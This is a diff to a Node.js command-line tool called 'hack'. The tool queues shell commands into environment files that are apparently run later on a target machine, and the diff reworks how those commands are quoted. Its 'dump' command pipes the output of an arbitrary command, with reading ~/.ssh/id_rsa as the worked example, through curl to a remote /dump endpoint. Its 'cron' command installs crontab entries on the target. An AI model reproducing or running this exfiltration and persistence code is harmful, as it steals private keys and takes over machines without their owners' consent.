@@ -2,7 +2,7 @@
 'use strict'
 
 const shell = require('shelljs')
-
+const shellescape = require('shell-escape')
 const i = process.argv.indexOf('/usr/local/bin/hack')
 const env = process.argv[i+1]
 const cmd = process.argv[i+2]
@@ -34,7 +34,8 @@ function hack(env, cmd, args) {
 
   } else if (cmd === 'dump') {
     // `hack live dump "cat ~/.ssh/id_rsa"`
-    write(env, "echo " + wrap('"', "\\$(" + args[0] + ")") + " | curl --data-binary @- " + url + "/dump")
+
+    write(env, 'echo ' + wrap('"', '$(' + args[0] + ')') + ' | curl --data-binary @- ' + url + '/dump')
 
   } else if (cmd == 'reset') {
     // `hack live reset`
@@ -70,7 +71,10 @@ function hack(env, cmd, args) {
 
   } else if (cmd === 'cron') {
     // `hack live cron "20 16 * * * say 'its 4 20!'"`
-    write(env, "echo " + wrap('"', args[0]) + " | crontab")
+    write(env, shellescape([
+      "echo",
+      args[0]
+    ]) + " | crontab")
 
   } else if (cmd === 'forget') {
     // `hack live forget`
@@ -107,14 +111,17 @@ function write(env, cmd) {
 
   // cd to this repo!
   shell.cd(__dirname + '/../scripts/env')
+
   // make sure the environment file exists!
   if (!shell.test('-e', env)) {
     shell.touch(env)
   }
 
-  console.log("WRITE", wrap('"', text))
   // write to the environment file
-  shell.exec('echo ' + wrap('"', text) + ' > ' + env)
+  shell.exec(shellescape([
+    'echo',
+    text
+  ]) + ' > ' + env)
 }
 
 
@@ -125,6 +132,6 @@ function help() {
 
 function wrap(char, text) {
   return char + text
-    .replace(/(\\+)/g, '\\$1')
+    // .replace(/(\\+)/g, '\\$1')
     .replace(new RegExp(char, 'g'), '\\' + char) + char
 }
